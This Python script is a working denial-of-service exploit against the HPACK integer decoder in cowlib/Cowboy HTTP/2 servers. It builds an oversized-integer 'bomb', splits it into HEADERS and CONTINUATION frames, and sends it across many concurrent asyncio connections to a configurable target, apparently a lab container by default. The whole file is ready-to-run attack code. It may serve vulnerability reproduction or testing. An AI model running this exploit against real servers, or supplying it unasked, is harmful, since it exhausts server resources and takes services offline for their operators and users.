#!/usr/bin/env python3
"""cowlib HPACK integer-decoder DoS — high-concurrency async HTTP/2 (h2c) client.

Sends the HPACK oversized-integer bomb across NUM_CONCURRENT simultaneous
connections using asyncio (no threads), so thousands of connections can be
opened without hitting OS or threading limits.

Each connection:
    PREFACE → SETTINGS → HEADERS (no END_HEADERS) → CONTINUATION[*]
    (END_HEADERS on the last frame), carrying the
    0xFF + 0xFF×N + 0x00 indexed-header HPACK integer.

Environment:
    SERVER_HOST                default cowboy-server
    SERVER_PORT                default 8080
    PAYLOAD_CONTINUATIONS      default 524288   (= 512 KB bomb)
    NUM_CONCURRENT             default 100       (async — handles 1000s)
    SOCKET_TIMEOUT             default 15
    ATTACK_KEEPALIVE_SECS      default 60
"""

import asyncio, os

SERVER_HOST = os.environ.get("SERVER_HOST", "cowboy-server")
SERVER_PORT = int(os.environ.get("SERVER_PORT", "8080"))
PAYLOAD_CONTINUATIONS = int(os.environ.get("PAYLOAD_CONTINUATIONS", "524288"))
NUM_CONCURRENT = int(os.environ.get("NUM_CONCURRENT", "100"))
SOCKET_TIMEOUT = int(os.environ.get("SOCKET_TIMEOUT", "15"))
ATTACK_KEEPALIVE_SECS = int(os.environ.get("ATTACK_KEEPALIVE_SECS", "60"))
MAX_FRAME_PAYLOAD = 16_000

PREFACE = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"


def frame(ftype: int, flags: int, stream: int, payload: bytes) -> bytes:
    return (len(payload).to_bytes(3, "big") + bytes([ftype, flags])
            + stream.to_bytes(4, "big") + payload)


def build_bomb(n: int) -> bytes:
    return b"\xff" + b"\xff" * n + b"\x00"


async def attack_one(bomb: bytes, idx: int) -> None:
    try:
        reader, writer = await asyncio.wait_for(
            asyncio.open_connection(SERVER_HOST, SERVER_PORT),
            timeout=SOCKET_TIMEOUT)

        chunks = [bomb[i:i + MAX_FRAME_PAYLOAD]
                  for i in range(0, len(bomb), MAX_FRAME_PAYLOAD)]

        writer.write(PREFACE)
        writer.write(frame(0x4, 0x0, 0, b""))      # SETTINGS
        writer.write(frame(0x1, 0x0, 1, chunks[0]))  # HEADERS
        for chunk in chunks[1:]:
            flags = 0x4 if chunk is chunks[-1] else 0x0
            writer.write(frame(0x9, flags, 1, chunk))
        await writer.drain()

        # Keepalive — the server will close after decode (+ error → GOAWAY)
        # or we time out.
        t0 = asyncio.get_event_loop().time()
        try:
            while True:
                remaining = ATTACK_KEEPALIVE_SECS - (asyncio.get_event_loop().time() - t0)
                if remaining <= 0:
                    break
                data = await asyncio.wait_for(reader.read(4096), timeout=remaining)
                if not data:
                    break
        except (asyncio.TimeoutError, ConnectionResetError):
            pass
        except Exception:
            pass
        finally:
            writer.close()
            await writer.wait_closed()
    except (asyncio.TimeoutError, ConnectionResetError, OSError):
        pass
    except Exception:
        pass


async def main():
    bomb = build_bomb(PAYLOAD_CONTINUATIONS)
    nframes = (len(bomb) + MAX_FRAME_PAYLOAD - 1) // MAX_FRAME_PAYLOAD
    bomb_kb = len(bomb) / 1024

    print(f"[*] HPACK bomb: {bomb_kb:.0f} KB ({PAYLOAD_CONTINUATIONS} cont octets, "
          f"{nframes} frames), concurrency={NUM_CONCURRENT}")
    print(f"[*] Target: {SERVER_HOST}:{SERVER_PORT}")
    print(f"[*] Launching {NUM_CONCURRENT} async attack tasks...")

    sem = asyncio.Semaphore(2000)  # throttle fd usage loosely

    async def bounded():
        async with sem:
            await attack_one(bomb, 0)

    tasks = [bounded() for _ in range(NUM_CONCURRENT)]
    await asyncio.gather(*tasks, return_exceptions=True)
    print(f"[*] Done — {NUM_CONCURRENT} connections dispatched.")


if __name__ == "__main__":
    asyncio.run(main())